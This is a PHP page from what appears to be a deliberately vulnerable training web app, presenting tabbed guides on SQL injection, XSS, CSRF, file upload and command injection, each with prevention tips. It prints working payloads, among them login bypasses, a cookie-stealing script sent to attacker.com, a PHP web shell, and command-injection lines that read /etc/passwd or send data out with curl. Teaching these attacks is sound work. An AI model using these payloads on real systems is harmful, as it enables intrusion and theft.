<?php
session_start();
include('includes/config.php');
include('includes/functions.php');

// Check if user is logged in
if (!isLoggedIn()) {
    header('Location: login.php');
    exit();
}

$pageTitle = "Security Guide - CVWA";
include('includes/header.php');
?>

<div class="container mt-4">
    <div class="row">
        <div class="col-md-12">
            <div class="card">
                <div class="card-header">
                    <h4>Security Guide</h4>
                </div>
                <div class="card-body">
                    <ul class="nav nav-tabs" id="securityTabs" role="tablist">
                        <li class="nav-item" role="presentation">
                            <button class="nav-link active" id="sql-tab" data-bs-toggle="tab" data-bs-target="#sql" type="button" role="tab">SQL Injection</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="xss-tab" data-bs-toggle="tab" data-bs-target="#xss" type="button" role="tab">XSS</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="csrf-tab" data-bs-toggle="tab" data-bs-target="#csrf" type="button" role="tab">CSRF</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="file-tab" data-bs-toggle="tab" data-bs-target="#file" type="button" role="tab">File Upload</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="command-tab" data-bs-toggle="tab" data-bs-target="#command" type="button" role="tab">Command Injection</button>
                        </li>
                    </ul>
                    
                    <div class="tab-content mt-4" id="securityTabsContent">
                        <!-- SQL Injection Tab -->
                        <div class="tab-pane fade show active" id="sql" role="tabpanel" aria-labelledby="sql-tab">
                            <h5>SQL Injection Cheat Sheet</h5>
                            <p>SQL Injection occurs when user input is incorrectly filtered and directly included in SQL queries, allowing attackers to manipulate the database.</p>
                            
                            <div class="alert alert-info">
                                This guide is based on <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank">PortSwigger's SQL Injection Cheat Sheet</a>.
                            </div>
                            
                            <h6>Basic SQL Injection Tests</h6>
                            <div class="code-block">
                                <pre><code>' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1--
' OR 1=1#
" OR 1=1--
" OR 1=1#
' OR '1'='1' LIMIT 1 -- -
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+</code></pre>
                            </div>
                            
                            <h6>Database Version Detection</h6>
                            <div class="code-block">
                                <pre><code>-- MySQL
' UNION SELECT @@version -- -

-- SQL Server
' UNION SELECT @@version -- -

-- Oracle
' UNION SELECT banner FROM v$version WHERE rownum=1 -- -

-- PostgreSQL
' UNION SELECT version() -- -</code></pre>
                            </div>
                            
                            <h6>Database Content Extraction</h6>
                            <div class="code-block">
                                <pre><code>-- List tables
' UNION SELECT table_name,1 FROM information_schema.tables -- -

-- List columns in a table
' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users' -- -

-- Extract data
' UNION SELECT username,password FROM users -- -</code></pre>
                            </div>
                            
                            <h6>Bypassing Authentication</h6>
                            <div class="code-block">
                                <pre><code>-- Simple login bypass
username: admin' --
password: anything

-- OR technique
username: admin' OR '1'='1
password: anything</code></pre>
                            </div>
                            
                            <h6>Prevention Techniques</h6>
                            <ul>
                                <li>Use prepared statements with parameterized queries</li>
                                <li>Apply input validation and sanitization</li>
                                <li>Implement least privilege principle for database users</li>
                                <li>Use ORM frameworks that handle SQL securely</li>
                                <li>Enable WAF (Web Application Firewall) rules</li>
                            </ul>
                        </div>
                        
                        <!-- XSS Tab -->
                        <div class="tab-pane fade" id="xss" role="tabpanel" aria-labelledby="xss-tab">
                            <h5>Cross-Site Scripting (XSS) Guide</h5>
                            <p>XSS allows attackers to inject client-side scripts into web pages viewed by others, potentially stealing cookies, session tokens, or redirecting users to malicious sites.</p>
                            
                            <h6>Types of XSS</h6>
                            <ul>
                                <li><strong>Reflected XSS</strong>: Occurs when user input is immediately returned by a web application in an error message, search result, etc.</li>
                                <li><strong>Stored XSS</strong>: Occurs when user input is stored on the target server (in a database, message forum, visitor log, etc.)</li>
                                <li><strong>DOM-based XSS</strong>: Occurs within the Document Object Model (DOM) rather than in the HTML</li>
                            </ul>
                            
                            <h6>Basic XSS Payloads</h6>
                            <div class="code-block">
                                <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
&lt;img src="x" onerror="alert('XSS')"&gt;
&lt;body onload="alert('XSS')"&gt;
&lt;svg onload="alert('XSS')"&gt;
&lt;iframe src="javascript:alert('XSS')"&gt;</code></pre>
                            </div>
                            
                            <h6>Cookie Stealing Payload</h6>
                            <div class="code-block">
                                <pre><code>&lt;script&gt;
fetch('https://attacker.com/steal?cookie='+document.cookie);
&lt;/script&gt;</code></pre>
                            </div>
                            
                            <h6>Prevention Techniques</h6>
                            <ul>
                                <li>Encode output data (HTML, URL, JavaScript encoding)</li>
                                <li>Use Content-Security-Policy headers</li>
                                <li>Implement input validation and sanitization</li>
                                <li>Use modern frameworks that automatically escape output</li>
                                <li>Set HttpOnly flag on sensitive cookies</li>
                            </ul>
                        </div>
                        
                        <!-- CSRF Tab -->
                        <div class="tab-pane fade" id="csrf" role="tabpanel" aria-labelledby="csrf-tab">
                            <h5>Cross-Site Request Forgery (CSRF) Guide</h5>
                            <p>CSRF forces authenticated users to execute unwanted actions on a web application in which they're currently authenticated.</p>
                            
                            <h6>Example CSRF Attack</h6>
                            <div class="code-block">
                                <pre><code>&lt;!-- Hidden form that automatically submits --&gt;
&lt;form action="https://vulnerable-site.com/change_password" method="POST" id="csrf-form"&gt;
  &lt;input type="hidden" name="new_password" value="hacked"&gt;
&lt;/form&gt;
&lt;script&gt;
  document.getElementById("csrf-form").submit();
&lt;/script&gt;</code></pre>
                            </div>
                            
                            <h6>CSRF via Image Tag</h6>
                            <div class="code-block">
                                <pre><code>&lt;img src="https://vulnerable-site.com/transfer?amount=1000&to=attacker" width="0" height="0" /&gt;</code></pre>
                            </div>
                            
                            <h6>Prevention Techniques</h6>
                            <ul>
                                <li>Implement anti-CSRF tokens in forms</li>
                                <li>Use the SameSite cookie attribute</li>
                                <li>Verify the Origin/Referer header</li>
                                <li>Require re-authentication for sensitive operations</li>
                                <li>Use custom request headers for AJAX requests</li>
                            </ul>
                        </div>
                        
                        <!-- File Upload Tab -->
                        <div class="tab-pane fade" id="file" role="tabpanel" aria-labelledby="file-tab">
                            <h5>Insecure File Upload Guide</h5>
                            <p>Insecure file uploads can lead to code execution, path traversal, denial of service, or client-side attacks.</p>
                            
                            <h6>Common Attack Vectors</h6>
                            <ul>
                                <li>Uploading server-side executable scripts (PHP, ASP, etc.)</li>
                                <li>Bypassing client-side validation</li>
                                <li>Using double extensions (image.php.jpg)</li>
                                <li>Exploiting MIME type confusion</li>
                                <li>Using path traversal to write files to unauthorized locations</li>
                            </ul>
                            
                            <h6>PHP Shell Example</h6>
                            <div class="code-block">
                                <pre><code>&lt;?php
  echo "File Upload Vulnerability Exploited!";
  echo "&lt;pre&gt;";
  system($_GET['cmd']);
  echo "&lt;/pre&gt;";
?&gt;</code></pre>
                            </div>
                            
                            <h6>Prevention Techniques</h6>
                            <ul>
                                <li>Validate file extensions and MIME types both client and server-side</li>
                                <li>Generate new random filenames</li>
                                <li>Store uploaded files outside the web root</li>
                                <li>Use a content delivery network (CDN) for user uploads</li>
                                <li>Set proper file permissions</li>
                                <li>Scan uploaded files with antivirus software</li>
                            </ul>
                        </div>
                        
                        <!-- Command Injection Tab -->
                        <div class="tab-pane fade" id="command" role="tabpanel" aria-labelledby="command-tab">
                            <h5>Command Injection Guide</h5>
                            <p>Command injection occurs when an application passes unsafe user-supplied data to a system shell.</p>
                            
                            <h6>Basic Command Injection Techniques</h6>
                            <div class="code-block">
                                <pre><code>; ls -la
& ipconfig
| cat /etc/passwd
$(cat /etc/passwd)
`cat /etc/passwd`
|| whoami
&& whoami</code></pre>
                            </div>
                            
                            <h6>Blind Command Injection</h6>
                            <div class="code-block">
                                <pre><code>; ping -c 4 attacker.com
; curl http://attacker.com/?data=$(whoami)
& nslookup %USERNAME%.attacker.com</code></pre>
                            </div>
                            
                            <h6>Prevention Techniques</h6>
                            <ul>
                                <li>Avoid using system commands with user input</li>
                                <li>Use built-in library functions instead of system commands</li>
                                <li>Implement a whitelist of allowed characters/commands</li>
                                <li>Sanitize and validate user input</li>
                                <li>Run the application with minimal privileges</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<?php include('includes/footer.php'); ?>